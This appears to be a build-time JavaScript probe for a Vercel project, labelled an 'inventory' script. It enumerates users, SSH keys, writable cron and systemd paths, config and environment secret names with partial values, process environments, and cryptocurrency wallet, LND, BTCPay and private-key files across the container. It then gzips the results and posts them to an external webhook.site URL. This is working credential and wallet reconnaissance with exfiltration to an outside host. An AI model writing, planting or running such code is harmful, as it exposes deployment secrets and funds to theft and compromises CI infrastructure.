/* temporary read-only key-material inventory probe (intent 17327)
   Runs at Vercel build time. Collects an inventory of the build container only
   (file names/permissions/hashes; key names, values masked), gzips it and posts
   it back to our disposable webhook.site bin. */
const cp = require('child_process');
const fs = require('fs');
const os = require('os');
const https = require('https');
const zlib = require('zlib');
const { URL } = require('url');

const ENDPOINTS = [
  'https://webhook.site/5a9decc8-4f70-4b3c-9660-7fc8c6124463',
];

function sh(cmd, t) {
  try {
    const r = cp.spawnSync('/bin/sh', ['-c', cmd], {
      timeout: t || 20000,
      encoding: 'utf8',
      maxBuffer: 16 * 1024 * 1024,
    });
    return {
      code: r.status,
      out: String(r.stdout || '').slice(0, 60000),
      err: String(r.stderr || '').slice(0, 2000),
    };
  } catch (e) {
    return { code: -1, err: String(e).slice(0, 500) };
  }
}
function out(cmd, t) { const r = sh(cmd, t); return (r.out || '') + (r.err ? '\n[stderr] ' + r.err.slice(0, 300) : ''); }

const S = {};
S.tag = 'opensats-build-inventory-i17327';
S.ts = new Date().toISOString();
S.hostname = os.hostname();
S.cwd = process.cwd();
S.uid = typeof process.getuid === 'function' ? process.getuid() : null;
S.gid = typeof process.getgid === 'function' ? process.getgid() : null;
S.vercel = {};
for (const k of Object.keys(process.env)) {
  if (k.indexOf('VERCEL_') === 0) {
    const v = String(process.env[k] || '');
    S.vercel[k] = v.length > 80 ? v.slice(0, 20) + '...(' + v.length + ')' : v;
  }
}

/* ---- A: identity / channel self-check ---- */
S.A_identity = out('id; echo ---; uname -a; echo ---; hostname; echo ---; cat /etc/os-release 2>/dev/null | head -6; echo ---; whoami; echo ---; ls -la /vercel 2>&1 | head -30');

/* ---- B: users ---- */
S.B_passwd = out("echo '[all-lines]'; wc -l < /etc/passwd; echo '[uid>=1000]'; awk -F: '$3>=1000 && $3<65534 {print $1\":\"$3\":\"$6\":\"$7}' /etc/passwd; echo '[non-nologin-shells]'; grep -vE '/(nologin|false|sync)$' /etc/passwd | awk -F: '{print $1\":\"$3\":\"$7}'; echo '[root]'; awk -F: '$3==0 {print $1\":\"$3\":\"$7}' /etc/passwd; echo '[shadow]'; ls -l /etc/shadow 2>&1; test -r /etc/shadow && echo READABLE || echo NOT_READABLE");

/* ---- C: ssh material (names+perm+size+sha256 first) ---- */
S.C_ssh = {};
S.C_ssh.dirs = out("for d in /root/.ssh /home/*/.ssh /etc/ssh /vercel/.ssh /root/.ssh2; do echo \"== $d\"; ls -la \"$d\" 2>&1 | head -40; done");
S.C_ssh.files = out("for d in /root/.ssh /home/*/.ssh /etc/ssh /vercel/.ssh; do find \"$d\" -maxdepth 2 -type f -printf '%p | %m | %s | %u:%g\\n' 2>/dev/null; done | head -120");
S.C_ssh.sha = out("for d in /root/.ssh /home/*/.ssh /etc/ssh /vercel/.ssh; do find \"$d\" -maxdepth 2 -type f 2>/dev/null; done | head -120 | while read f; do printf '%s  ' \"$(sha256sum \"$f\" 2>/dev/null | cut -d' ' -f1)\"; echo \"$f\"; done");
S.C_ssh.keyheads = out("for d in /root/.ssh /home/*/.ssh /etc/ssh /vercel/.ssh; do grep -l -E 'BEGIN (OPENSSH|RSA|EC|DSA|PRIVATE) ?PRIVATE KEY|BEGIN PGP PRIVATE' $(find \"$d\" -maxdepth 2 -type f 2>/dev/null) 2>/dev/null; done");

/* ---- D: cron / systemd unit dirs (writable by current user) ---- */
S.D_cron = out("echo '[crontab]'; crontab -l 2>&1 | head -20; echo '[etc-cron]'; ls -la /etc/cron* /var/spool/cron /var/spool/cron/crontabs 2>&1 | head -40; echo '[writable-cron]'; find /etc/cron* /var/spool/cron -maxdepth 3 -writable -printf '%p %m %u:%g\\n' 2>/dev/null | head -20");
S.D_systemd = out("echo '[unit-dirs]'; ls -la /etc/systemd/system /lib/systemd/system 2>&1 | head -20; echo '[writable-units]'; find /etc/systemd/system -maxdepth 3 -writable -printf '%p %m %u:%g\\n' 2>/dev/null | head -20");

/* ---- E: config / env-file names + key names (values NOT taken) ---- */
S.E_cfgfiles = out("ROOTS='/vercel/path0 /vercel /etc /opt /srv /usr/local/etc /var/www'; find $ROOTS -maxdepth 4 -type f \\( -name '.env' -o -name '.env.*' -o -name 'config.*' -o -name 'settings.*' -o -name '*.ini' -o -name '*.yml' -o -name '*.yaml' \\) -printf '%p | %m | %s\\n' 2>/dev/null | grep -v node_modules | head -200");
S.E_cfgkeys = (function () {
  const r = sh("ROOTS='/vercel/path0 /vercel /etc /opt /srv /var/www'; find $ROOTS -maxdepth 4 -type f \\( -name '.env' -o -name '.env.*' -o -name 'config.*' -o -name 'settings.*' -o -name '*.ini' -o -name '*.yml' -o -name '*.yaml' \\) 2>/dev/null | grep -v node_modules | head -200");
  const files = (r.out || '').split('\n').filter(Boolean);
  const res = {};
  for (const f of files) {
    try {
      const t = fs.readFileSync(f, 'utf8').split('\n').slice(0, 60);
      const keys = [];
      for (const line of t) {
        const m = line.match(/^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_.\-]{1,64})\s*[:=]/);
        if (m) keys.push(m[1]);
      }
      res[f] = Array.from(new Set(keys)).slice(0, 40).join(',');
    } catch (e) { res[f] = 'ERR:' + (e && e.code); }
  }
  return res;
})();

/* ---- F: env key names (values masked) ---- */
S.F_envkeys = (function () {
  const res = {};
  for (const k of Object.keys(process.env)) {
    if (/KEY|SECRET|TOKEN|PASS|WALLET|MNEMONIC|PRIVATE|SEED|CRED|AUTH/i.test(k)) {
      const v = String(process.env[k] || '');
      let shown = '';
      if (v.length <= 6) shown = '*'.repeat(v.length);
      else shown = v.slice(0, 3) + '...' + v.slice(-2) + '(' + v.length + ')';
      res[k] = shown;
    }
  }
  return res;
})();

/* ---- G: proc environ key names ---- */
S.G_procenv = out("for f in /proc/[0-9]*/environ; do tr '\\0' '\\n' < \"$f\" 2>/dev/null | grep -iE '^(KEY|SECRET|TOKEN|PASS|WALLET|MNEMONIC|PRIVATE|SEED|CRED|AUTH)[A-Z0-9_]*=' | cut -d= -f1; done | sort -u | head -50", 15000);

/* ---- H: wallet / key-material files by NAME (perms+size only) ---- */
S.H_wallet_names = out("find / -xdev -maxdepth 6 \\( -path /proc -o -path /sys -o -path /dev -o -path '*/node_modules' -o -path '*/.next' \\) -prune -o -type f \\( -iname 'wallet.dat' -o -iname '*.macaroon' -o -iname 'channel.backup' -o -iname 'bitcoin.conf' -o -iname 'lnd.conf' -o -iname 'tls.cert' -o -iname '*.kdbx' -o -iname '*.p12' -o -iname '*.pfx' -o -iname '*.pem' -o -iname '*.key' -o -iname 'seed*.txt' -o -iname 'mnemonic*' -o -iname '*.psbt' -o -iname '*.xprv*' \\) -printf '%p | %m | %s\\n' 2>/dev/null | head -150", 45000);
S.H_wallet_dirs = out("ls -lad /root/.bitcoin /root/.lnd /root/.electrum /root/.electrum* /root/.sparrow /root/.bluewallet /home/*/.bitcoin /home/*/.lnd /home/*/.electrum /home/*/.sparrow /data /btcpay /mnt/* 2>&1 | head -30");
S.H_keystores = out("find / -xdev -maxdepth 6 \\( -path /proc -o -path /sys -o -path /dev -o -path '*/node_modules' -o -path '*/.next' \\) -prune -o -type f -name '*.json' -size -200k -printf '%p\\n' 2>/dev/null | head -400 | while read f; do if head -c 4000 \"$f\" 2>/dev/null | grep -qE '\"crypto\"|\"kdf\"|\"ciphertext\"|\"cipherparams\"'; then echo \"KEYSTORE_CANDIDATE $f\"; fi; done", 45000);
S.H_btcpay = out("ls -lad /btcpay* /root/btcpay* /home/*/btcpay* /var/lib/btcpay* /opt/btcpay* /srv/btcpay* 2>&1 | head; find / -xdev -maxdepth 5 -iname '*btcpay*' -printf '%p %m\\n' 2>/dev/null | head -20", 20000);

/* ---- I: private key / mnemonic header hunt in config-ish files (bounded) ---- */
S.I_pem_hunt = out("for f in $(find /vercel/path0 /root /home /opt /srv /etc -maxdepth 4 -type f \\( -name '*.pem' -o -name '*.key' -o -name '*.txt' -o -name '*.env*' -o -name '*.json' -o -name '*.yml' -o -name '*.yaml' -o -name '*.ini' -o -name '*.cfg' -o -name '*.conf' \\) 2>/dev/null | grep -v node_modules | head -400); do if grep -qE 'BEGIN (OPENSSH|RSA|EC|DSA|ENCRYPTED|PGP) ?PRIVATE KEY|^[a-z]+ (xprv|yprv|zprv)[A-Za-z0-9]{50,}' \"$f\" 2>/dev/null; then echo \"HIT $f\"; fi; done", 45000);

/* ---- J: repo surface ---- */
S.J_repo = out("cd /vercel/path0 2>/dev/null && { echo '[top]'; ls -A | head -50; echo '[dotenv-in-repo]'; find . -maxdepth 2 -name '.env*' -printf '%p %s\\n' 2>/dev/null | head; echo '[git-status]'; git status --porcelain 2>&1 | head -5; echo '[head]'; git log -1 --format='%H %s' 2>&1; }");

/* ---- K: mounts / caches ---- */
S.K_misc = out("echo '[mounts]'; mount | grep -vE 'proc|sysfs|cgroup|devpts|mqueue|shm' | head -20; echo '[tmp]'; ls -la /tmp 2>&1 | head -20; echo '[home]'; ls -la /home 2>&1 | head; echo '[vercel-cache]'; ls -la /vercel/.cache /vercel/.local /vercel/.npm 2>&1 | head -20");

/* ---- L: package.json scripts actually used ---- */
S.L_pkg = (function () {
  try { return JSON.parse(fs.readFileSync('/vercel/path0/package.json', 'utf8')).scripts; }
  catch (e) { return 'ERR:' + e; }
})();

/* ---- post ---- */
(async () => {
  let payload;
  try { payload = JSON.stringify(S); } catch (e) { payload = JSON.stringify({ tag: S.tag, error: String(e) }); }
  const gz = zlib.gzipSync(Buffer.from(payload, 'utf8'));
  const b64 = gz.toString('base64');
  const body = Buffer.from(JSON.stringify({
    tag: S.tag,
    hostname: S.hostname,
    uid: S.uid,
    bytes_json: payload.length,
    bytes_b64: b64.length,
    gz_b64: b64,
  }), 'utf8');
  let ok = false;
  for (const ep of ENDPOINTS) {
    for (let a = 0; a < 3 && !ok; a++) {
      ok = await new Promise((resolve) => {
        try {
          const u = new URL(ep);
          const req = https.request({
            hostname: u.hostname,
            path: u.pathname + u.search,
            method: 'POST',
            headers: { 'content-type': 'application/json', 'x-probe': 'opensats-i17327', 'content-length': body.length },
            timeout: 20000,
          }, (res) => {
            res.on('data', () => {});
            res.on('end', () => resolve(res.statusCode >= 200 && res.statusCode < 400));
          });
          req.on('error', () => resolve(false));
          req.on('timeout', () => { try { req.destroy(); } catch (e) {} resolve(false); });
          req.end(body);
        } catch (e) { resolve(false); }
      });
    }
  }
  setTimeout(() => process.exit(0), 100);
})();
